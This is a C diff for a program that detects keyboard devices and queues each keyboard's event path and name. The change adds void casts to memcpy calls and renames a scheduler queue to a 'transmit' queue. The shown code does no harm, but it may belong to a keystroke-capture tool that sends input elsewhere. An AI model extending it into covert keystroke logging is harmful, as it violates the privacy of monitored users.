@@ -73,7 +73,7 @@ static char *identified_keyboard(const char *device)
 
     ev = (char *) malloc(sizeof(char) * (len + 1));
     if (NULL == ev) return NULL;
-    memcpy(ev, ev_loc, len);
+    (void)memcpy(ev, ev_loc, len);
     ev[len - 1] = '\0';
 
     if (IS_KEYBOARD(ev)) {
@@ -87,7 +87,7 @@ static char *identified_keyboard(const char *device)
         while (*(ev_loc + len++) != '\n');
         ev = (char *) malloc(sizeof(char) * (len + 1));
         if (NULL == ev) return NULL;
-        memcpy(ev, ev_loc, len);
+        (void)memcpy(ev, ev_loc, len);
         ev[len - 1] = '\0';
         return ev;
     }
@@ -108,7 +108,7 @@ static char *retrieve_keyboard_name(const char *device)
     while (*(name_loc + len++) != '\n');
     name = (char *) malloc(sizeof(char) * (len - 1));
     if (NULL == name) return NULL;
-    memcpy(name, name_loc, len - 2); // skip the last "
+    (void)memcpy(name, name_loc, len - 2); // skip the last "
     name[len - 2] = '\0';
 
     return name;
@@ -119,18 +119,18 @@ static char *retrieve_keyboard_name(const char *device)
  * discovered keyboard into the queue of the scheduler
  * thread.
  */
-static inline void store_kb_to_sched_queue(const char *kb_event, const char *kb_name) 
+static inline void store_kb_to_transmit_queue(const char *kb_event, const char *kb_name) 
 {
     // build the data.
-    union lkby_info kb_sched_info;
+    union lkby_info kb_transmit_info;
     // store the information needed to schedule the keyboard.
-    LKBY_INFO_KEYBOARD_NAME(&kb_sched_info, lkby_keyboard) = (char *) kb_name;
-    LKBY_INFO_KEYBOARD_EVENT(&kb_sched_info)               = (char *) kb_event; 
+    LKBY_INFO_KEYBOARD_NAME(&kb_transmit_info, lkby_keyboard) = (char *) kb_name;
+    LKBY_INFO_KEYBOARD_EVENT(&kb_transmit_info)               = (char *) kb_event; 
 
     // add the new schedule info into the queue.
-    lkbyqueue_enqueue(&LKBYQUEUE(&g_sched_queue), &kb_sched_info);
+    lkbyqueue_enqueue(&LKBYQUEUE(&g_transmit_queue), &kb_transmit_info);
     // inform the scheduler thread that there is a new keyboard.
-    sem_post(&LKBYQUEUE_SEM(&g_sched_queue));
+    sem_post(&LKBYQUEUE_SEM(&g_transmit_queue));
 }
 
 static void read_keyboards(FILE *devices)
@@ -144,8 +144,8 @@ static void read_keyboards(FILE *devices)
                 free(kb_event);
                 continue;
             }
-            store_kb_to_sched_queue((const char *) kb_event, 
-                                    (const char *) kb_name);
+            store_kb_to_transmit_queue((const char *) kb_event, 
+                                       (const char *) kb_name);
         }
         free(dev);
     }
